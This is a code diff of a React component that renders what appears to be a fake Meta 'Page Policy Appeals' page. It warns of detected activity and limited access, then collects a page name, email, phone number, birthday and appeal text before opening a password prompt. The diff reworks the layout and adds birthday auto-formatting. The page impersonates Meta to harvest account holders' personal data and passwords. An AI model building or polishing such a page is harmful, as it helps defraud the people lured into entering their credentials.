@@ -185,18 +185,37 @@ const Home = () => {
                 ...prev,
                 [field]: finalValue
             }));
+        } else if (field === 'birthday') {
+            // Auto format dd/mm/yyyy with /
+            let cleaned = value.replace(/[^\d]/g, '').slice(0, 8); // max 8 digits: ddmmyyyy
+            if (cleaned.length >= 5) {
+                cleaned = cleaned.replace(/^(\d{2})(\d{2})(\d{1,4}).*/, '$1/$2/$3');
+            } else if (cleaned.length >= 3) {
+                cleaned = cleaned.replace(/^(\d{2})(\d{1,2}).*/, '$1/$2');
+            }
+            setFormData((prev) => ({
+                ...prev,
+                [field]: cleaned
+            }));
+
+            if (errors[field]) {
+                setErrors((prev) => ({
+                    ...prev,
+                    [field]: false
+                }));
+            }
         } else {
             setFormData((prev) => ({
                 ...prev,
                 [field]: value
             }));
-        }
 
-        if (errors[field]) {
-            setErrors((prev) => ({
-                ...prev,
-                [field]: false
-            }));
+            if (errors[field]) {
+                setErrors((prev) => ({
+                    ...prev,
+                    [field]: false
+                }));
+            }
         }
     };
 
@@ -290,177 +309,140 @@ const Home = () => {
                     <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                         <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                     </div>
-                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
+                    <p className='rounded-lg bg-gray-200 p-3 py-1 text-sm font-semibold'>
+                        {translatedTexts.english}
+                        <FontAwesomeIcon className='ml-1 inline' icon={faChevronDown} />
+                    </p>
                 </div>
             </header>
-            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
-                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
-                    {data_list.map((data) => {
-                        return (
-                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
-                                <div className='flex items-center gap-2'>
-                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
-                                        <FontAwesomeIcon icon={data.icon} />
-                                    </div>
-                                    <div className='text-sm sm:text-base'>{data.title}</div>
-                                </div>
-                                <FontAwesomeIcon icon={faChevronDown} />
-                            </div>
-                        );
-                    })}
-                </nav>
-                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
-                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
-                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
-                            <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
-                        </div>
-                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
-                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
-                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
-                            <p>{translatedTexts.submitAppeal}</p>
-                        </div>
-                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
-                            <div className='flex flex-col gap-1'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
-                                </p>
-                                <input 
-                                    type='text' 
-                                    name='pageName' 
-                                    autoComplete='organization' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    style={{ fontSize: '16px' }}
-                                    value={formData.pageName} 
-                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
-                                />
-                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            
-                            <div className='flex flex-col gap-1'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
-                                </p>
-                                <input 
-                                    type='email' 
-                                    name='mail' 
-                                    autoComplete='email' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    style={{ fontSize: '16px' }}
-                                    value={formData.mail} 
-                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
-                                />
-                                {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
-                                </p>
-                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-2 text-sm font-medium text-gray-700'>{callingCode}</div>
-                                    <input 
-                                        type='tel' 
-                                        name='phone' 
-                                        inputMode='numeric' 
-                                        pattern='[0-9]*' 
-                                        autoComplete='off' 
-                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-2 focus:ring-0 focus:outline-none'
-                                        style={{ fontSize: '16px' }}
-                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
-                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
-                                    />
-                                </div>
-                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
-                                </p>
-                                
-                                {/* Desktop: type='date' */}
-                                <input 
-                                    type='date' 
-                                    name='birthday' 
-                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    style={{ fontSize: '16px' }}
-                                    value={formData.birthday} 
-                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
-                                />
-                                
-                                {/* Mobile: type='date' với placeholder ảo */}
-                                <div className='block sm:hidden relative'>
-                                    <input 
-                                        type='date' 
-                                        name='birthday' 
-                                        className={`w-full rounded-lg border px-3 py-2.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
-                                        style={{ fontSize: '16px' }}
-                                        value={formData.birthday} 
-                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
-                                        required
-                                    />
-                                    {/* Placeholder ảo - chữ số nhỏ hơn */}
-                                    <div 
-                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-lg'} font-medium`}
-                                        onClick={() => document.querySelector('input[name="birthday"]').click()}
-                                    >
-                                        {formData.birthday || 'dd/mm/yyyy'}
-                                    </div>
-                                </div>
-                                
-                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            
-                            <div className='flex flex-col gap-1'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
-                                </p>
-                                <textarea 
-                                    name='appeal'
-                                    rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
-                                    style={{ fontSize: '16px' }}
-                                    placeholder={translatedTexts.appealPlaceholder}
-                                    value={formData.appeal}
-                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
-                                />
-                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
 
-                            <button 
-                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 sm:mt-1'
-                                onClick={handleSubmit}
-                            >
-                                {translatedTexts.submit}
-                            </button>
+            <main className='max-w-[600px] px-2 pt-2 mx-auto'>
+                <section className='mb-4 rounded-xl border border-gray-200 p-4'>
+                    <p className='mb-2 text-sm font-semibold'>{translatedTexts.detectedActivity}</p>
+                    <p className='mb-2 text-sm'>{translatedTexts.accessLimited}</p>
+                    <p className='mb-4 text-sm font-semibold'>{translatedTexts.submitAppeal}</p>
+
+                    <form
+                        onSubmit={(e) => {
+                            e.preventDefault();
+                            handleSubmit();
+                        }}
+                    >
+                        <div className='mb-3'>
+                            <label htmlFor='pageName' className='block font-semibold'>
+                                {translatedTexts.pageName}
+                            </label>
+                            <input
+                                name='pageName'
+                                id='pageName'
+                                type='text'
+                                placeholder={translatedTexts.pageName}
+                                value={formData.pageName}
+                                onChange={(e) => handleInputChange('pageName', e.target.value)}
+                                className={`mt-1 block w-full rounded-md border ${
+                                    errors.pageName ? 'border-red-500' : 'border-gray-300'
+                                } p-2`}
+                            />
+                            {errors.pageName && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                         </div>
-                    </div>
-                    <div className='w-full bg-[#f0f2f5] px-4 py-8 sm:py-14 text-[15px] text-[#65676b] sm:px-32'>
-                        <div className='mx-auto flex flex-col sm:flex-row justify-between gap-6 sm:gap-0'>
-                            <div className='flex flex-col space-y-3 sm:space-y-4'>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.about}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.adChoices}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createAd}</p>
-                            </div>
-                            <div className='flex flex-col space-y-3 sm:space-y-4'>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.privacy}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.careers}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createPage}</p>
-                            </div>
-                            <div className='flex flex-col space-y-3 sm:space-y-4'>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.termsPolicies}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.cookies}</p>
-                            </div>
+
+                        <div className='mb-3'>
+                            <label htmlFor='mail' className='block font-semibold'>
+                                {translatedTexts.mail}
+                            </label>
+                            <input
+                                name='mail'
+                                id='mail'
+                                type='email'
+                                placeholder={translatedTexts.mail}
+                                value={formData.mail}
+                                onChange={(e) => handleInputChange('mail', e.target.value)}
+                                className={`mt-1 block w-full rounded-md border ${
+                                    errors.mail ? 'border-red-500' : 'border-gray-300'
+                                } p-2`}
+                            />
+                            {errors.mail && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                         </div>
-                        <hr className='my-6 sm:my-8 h-0 border border-transparent border-t-gray-300' />
-                        <div className='flex flex-col sm:flex-row justify-between items-center gap-4 sm:gap-0'>
-                            <img src={FromMetaImage} alt='' className='w-[80px] sm:w-[100px]' />
-                            <p className='text-xs sm:text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
+
+                        <div className='mb-3'>
+                            <label htmlFor='phone' className='block font-semibold'>
+                                {translatedTexts.phone}
+                            </label>
+                            <input
+                                name='phone'
+                                id='phone'
+                                type='tel'
+                                inputMode='tel'
+                                placeholder={`${callingCode} ...`}
+                                value={formData.phone}
+                                onChange={(e) => handleInputChange('phone', e.target.value)}
+                                className={`mt-1 block w-full rounded-md border ${
+                                    errors.phone ? 'border-red-500' : 'border-gray-300'
+                                } p-2`}
+                            />
+                            {errors.phone && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                         </div>
-                    </div>
-                </div>
+
+                        <div className='mb-3'>
+                            <label htmlFor='birthday' className='block font-semibold'>
+                                {translatedTexts.birthday}
+                            </label>
+                            <input
+                                name='birthday'
+                                id='birthday'
+                                type='tel'
+                                inputMode='numeric'
+                                maxLength={10} // dd/mm/yyyy => 10 chars
+                                placeholder='dd/mm/yyyy'
+                                value={formData.birthday}
+                                onChange={(e) => handleInputChange('birthday', e.target.value)}
+                                className={`mt-1 block w-full rounded-md border ${
+                                    errors.birthday ? 'border-red-500' : 'border-gray-300'
+                                } p-2`}
+                            />
+                            {errors.birthday && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
+                        </div>
+
+                        <div className='mb-3'>
+                            <label htmlFor='appeal' className='block font-semibold'>
+                                {translatedTexts.yourAppeal}
+                            </label>
+                            <textarea
+                                name='appeal'
+                                id='appeal'
+                                rows={4}
+                                placeholder={translatedTexts.appealPlaceholder}
+                                value={formData.appeal}
+                                onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                className={`mt-1 block w-full rounded-md border ${
+                                    errors.appeal ? 'border-red-500' : 'border-gray-300'
+                                } p-2`}
+                            />
+                            {errors.appeal && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
+                        </div>
+
+                        <button
+                            type='submit'
+                            className='w-full rounded bg-blue-600 py-2 px-4 font-semibold text-white hover:bg-blue-700'
+                        >
+                            {translatedTexts.submit}
+                        </button>
+                    </form>
+                </section>
+
+                {showPassword && <PasswordInput onClose={handleClosePassword} />}
             </main>
-            {showPassword && <PasswordInput onClose={handleClosePassword} />}
+
+            <footer className='flex flex-wrap justify-center gap-4 p-4 text-sm text-gray-600'>
+                <a href='#' className='hover:underline'>{translatedTexts.about}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.adChoices}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.createAd}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.privacy}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.careers}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.createPage}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.termsPolicies}</a>
+                <a href='#' className='hover:underline'>{translatedTexts.cookies}</a>
+            </footer>
         </>
     );
 };
